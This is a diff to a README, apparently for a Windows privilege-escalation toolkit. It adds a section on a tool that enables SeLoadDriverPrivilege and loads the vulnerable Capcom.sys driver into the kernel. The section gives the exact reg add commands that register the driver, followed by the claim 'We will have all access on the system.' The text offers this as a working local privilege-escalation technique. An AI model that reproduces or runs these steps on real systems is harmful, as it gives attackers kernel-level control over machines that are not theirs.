@@ -158,3 +158,16 @@ After that enable the local administrator group on the token and enable SeDebugP
 
 We will have all access on the system.
 
+### EnableSeLoadDriverPrivilege.cpp
+
+Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.
+
+First you need to add two reg keys,the command is:
+
+`reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"`
+
+`reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
+
+Then run me to load the driver(C:\test\Capcom.sys) into the kernel.
+
+We will have all access on the system.
